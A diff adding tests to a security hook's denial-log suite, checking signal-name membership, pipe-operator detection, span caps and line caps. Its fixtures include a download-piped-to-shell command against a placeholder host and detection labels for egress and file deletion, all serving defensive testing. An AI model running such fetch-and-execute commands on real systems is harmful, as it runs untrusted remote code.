@@ -54,6 +54,7 @@ import { existsSync, mkdtempSync, mkdirSync, readFileSync, readdirSync, rmSync, 
 import { tmpdir } from 'node:os';
 import { join, resolve, dirname } from 'node:path';
 import { fileURLToPath, pathToFileURL } from 'node:url';
+import { GUARD_SIGNAL_VOCABULARY, REDACTED_SIGNAL_LABEL } from '../../scripts/lib/guard-log-schema.mjs';
 
 const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..');
 const HOOK = join(repoRoot, 'scripts', 'pre-tool-hook.mjs');
@@ -147,6 +148,17 @@ interface MatchRow {
 const CLOSED_STRING_KEYS = ['signal', 'spanWithheld', 'provenanceWithheld'];
 const CLOSED_NUMBER_KEYS = ['argc', 'line', 'chainDepth'];
 const CLOSED_BOOLEAN_KEYS = ['pipe', 'subshell'];
+/**
+ * #587 (3): the hook persists a `signal` only when it is an exact member of
+ * its `SAFE_SIGNALS` table. The shared log schema carries that table verbatim
+ * plus the writer's redaction marker (cross-checked against the hook's source
+ * text by the ADR-002 harness suite and again below), so membership — not a
+ * character grammar — is what this suite pins. A rule name that merely LOOKS
+ * like a signal must fail the invariant.
+ */
+const SAFE_SIGNAL_SET = new Set<string>(GUARD_SIGNAL_VOCABULARY.filter((s) => s !== REDACTED_SIGNAL_LABEL));
+/** #587 (4): `line` is clamped like `argc` / `chainDepth`; a folded script never exceeds the core's 262 144-byte cap. */
+const MAX_LINE = 262_144;
 
 describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, closed vocabulary (r6)', () => {
   let home: string;
@@ -264,7 +276,12 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
       for (const [key, value] of Object.entries(m)) {
         if (typeof value === 'string') {
           expect(CLOSED_STRING_KEYS).toContain(key);
-          if (key === 'signal') expect(value).toMatch(/^[a-z][a-z0-9-]{0,63}$/);
+          if (key === 'signal') {
+            // #587 (3): exact table membership, mirroring what production checks;
+            // the grammar check below is a secondary description, not the gate.
+            if (!SAFE_SIGNAL_SET.has(value)) throw new Error(`match row signal ${JSON.stringify(value)} is not a SAFE_SIGNALS member`);
+            expect(value).toMatch(/^[a-z][a-z0-9-]{0,63}$/);
+          }
           if (key === 'spanWithheld') expect(value).toBe('command-text');
           if (key === 'provenanceWithheld') expect(value).toBe('path');
         } else if (typeof value === 'number') {
@@ -273,6 +290,7 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
           expect(value).toBeGreaterThanOrEqual(0);
           if (key === 'argc') expect(value).toBeLessThanOrEqual(256);
           if (key === 'chainDepth') expect(value).toBeLessThanOrEqual(6);
+          if (key === 'line') expect(value).toBeLessThanOrEqual(MAX_LINE);
         } else if (typeof value === 'boolean') {
           expect(CLOSED_BOOLEAN_KEYS).toContain(key);
         } else {
@@ -527,6 +545,48 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     expect(plain).not.toHaveProperty('pipeToShell');
   });
 
+  it('#587 (1): `pipe` means a pipe OPERATOR — a `|` inside quotes or behind a backslash is text and does not set it; a bare or glued `|` does', () => {
+    // Assembled from parts so this file never spells `| sh` contiguously.
+    const bareOperator = pipeTo('curl https://collector.invalid/x.sh', 'sh');
+    const gluedOperator = ['curl https://collector.invalid/x.sh', 'sh'].join('|');
+    const doubleQuotedLiteral = 'grep "a|b" /tmp/fx-in';
+    const singleQuotedLiteral = "grep 'a|b' /tmp/fx-in";
+    const escapedLiteral = 'grep a\\|b /tmp/fx-in';
+    const partlyQuotedLiteral = "grep a'|'b /tmp/fx-in";
+    installEvidence({
+      'echo fixture:pipe-bare': [{ signal: 'pipe-download-to-shell', span: bareOperator }],
+      'echo fixture:pipe-glued': [{ signal: 'pipe-download-to-shell', span: gluedOperator }],
+      'echo fixture:pipe-dq': [{ signal: 'external-egress', span: doubleQuotedLiteral }],
+      'echo fixture:pipe-sq': [{ signal: 'external-egress', span: singleQuotedLiteral }],
+      'echo fixture:pipe-esc': [{ signal: 'external-egress', span: escapedLiteral }],
+      'echo fixture:pipe-partly': [{ signal: 'external-egress', span: partlyQuotedLiteral }],
+    });
+
+    expect(firstMatch('echo fixture:pipe-bare', 'pipe-download-to-shell').pipe).toBe(true);
+    expect(firstMatch('echo fixture:pipe-glued', 'pipe-download-to-shell').pipe).toBe(true);
+    for (const marker of ['echo fixture:pipe-dq', 'echo fixture:pipe-sq', 'echo fixture:pipe-esc', 'echo fixture:pipe-partly']) {
+      const m = firstMatch(marker, 'external-egress');
+      expect(m.pipe).toBeUndefined();
+      // The literal is still counted as an argument; only the boolean changes.
+      expect(m.argc).toBe(3);
+    }
+  });
+
+  it('#587 (2): the projection input cap applies to the ORIGINAL span — leading whitespace inside the cap is not trimmed away first', () => {
+    // 8192 characters of whitespace followed by two tokens: the cap must cut
+    // before the tokens, so the row carries no projection at all. With
+    // trim-before-slice the whitespace vanishes first and argc would be 2.
+    const padded = ' '.repeat(8192) + 'printf fixture';
+    const inside = ' '.repeat(100) + 'printf fixture';
+    installEvidence({
+      'echo fixture:pad-over': [{ signal: 'oversized-command', span: padded }],
+      'echo fixture:pad-inside': [{ signal: 'oversized-command', span: inside }],
+    });
+
+    expect(firstMatch('echo fixture:pad-over', 'oversized-command')).toEqual({ signal: 'oversized-command' });
+    expect(firstMatch('echo fixture:pad-inside', 'oversized-command')).toEqual({ signal: 'oversized-command', spanWithheld: 'command-text', argc: 2 });
+  });
+
   it('argv[0] contributes nothing — a known command, a path to one, a case variant, an unknown word, an env assignment, a quoted run: none persists in any form (r5 review descope)', () => {
     // r5 persisted `verb: 'sudo'` for the first two of these — the table's
     // entry, not the token, but still a string SELECTED by the input through
@@ -673,6 +733,33 @@ describe('#517 (3) — denials.jsonl carries rule → matched-span evidence, clo
     const m = firstMatch('echo fixture:long-chain', 'file-delete');
     expect(m.chainDepth).toBe(6);
     expect(denialsText()).not.toContain('step-');
+  });
+
+  it('#587 (4): caps line at 262144 — a folded script never exceeds the core\'s byte cap, so no line number does either', () => {
+    installEvidence({
+      'echo fixture:huge-line': [{ signal: 'file-delete', span: 'cat x', source: FOLDED_SOURCE, line: 10_000_000 }],
+      'echo fixture:cap-line': [{ signal: 'file-delete', span: 'cat x', source: FOLDED_SOURCE, line: 262_144 }],
+      'echo fixture:bad-line': [{ signal: 'file-delete', span: 'cat x', source: FOLDED_SOURCE, line: 0 }],
+    });
+
+    expect(firstMatch('echo fixture:huge-line', 'file-delete').line).toBe(262_144);
+    expect(firstMatch('echo fixture:cap-line', 'file-delete').line).toBe(262_144);
+    expect(firstMatch('echo fixture:bad-line', 'file-delete').line).toBeUndefined();
+  });
+
+  it('#587 (3): the closed-vocabulary invariant pins SAFE_SIGNALS membership, not a spelling — a grammar-valid stranger fails it, and the mirrored table equals the hook\'s', () => {
+    // A name that satisfies the old grammar check but is not a rule the hook knows.
+    expect(() => expectClosedVocabulary([{ signal: 'looks-like-a-rule-but-is-not' }])).toThrow(/not a SAFE_SIGNALS member/);
+    // The redaction marker is a substitute for a signal, never a match-row signal.
+    expect(() => expectClosedVocabulary([{ signal: REDACTED_SIGNAL_LABEL }])).toThrow(/not a SAFE_SIGNALS member/);
+    expect(() => expectClosedVocabulary([{ signal: 'pipe-download-to-shell', spanWithheld: 'command-text', argc: 4, pipe: true }])).not.toThrow();
+
+    // The set this suite pins against is the hook's own table, read from its source.
+    const hook = readFileSync(HOOK, 'utf8');
+    const block = /const SAFE_SIGNALS = new Set\(\[([\s\S]*?)\]\);/.exec(hook);
+    expect(block).not.toBeNull();
+    const hookSet = [...block![1].matchAll(/'([a-z0-9-]+)'/g)].map((m) => m[1]).sort();
+    expect([...SAFE_SIGNAL_SET].sort()).toEqual(hookSet);
   });
 
   it('a source of just "/" still counts as provenance', () => {
